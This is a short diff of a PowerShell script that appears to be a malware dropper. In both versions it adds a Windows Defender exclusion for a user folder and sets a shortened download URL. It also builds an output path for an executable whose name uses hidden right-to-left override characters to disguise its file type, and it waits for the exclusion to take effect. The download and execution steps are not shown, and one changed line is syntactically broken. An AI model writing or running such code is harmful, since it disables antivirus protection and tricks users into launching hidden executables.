@@ -1,6 +1,6 @@
-Add-MpPreference -ExclusionPath $env:USERPROFILE\Downloads
+Add-MpPreference -ExclusionPath $env:USERPROFILE\Music
 $url = 'https://tinyurl.com/6mt3fcun'
-$outputFile = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'pictur‮‮‮‮gnp.exe')
+$outputFile = [System.IO.Path]::Combine($env:USERPROFILE, 'Music', 'base.exe‮‮‮‮'
 
 # Wait until the exclusion is confirmed (just a safeguard, usually it happens instantly)
 Start-Sleep -Milliseconds 100 
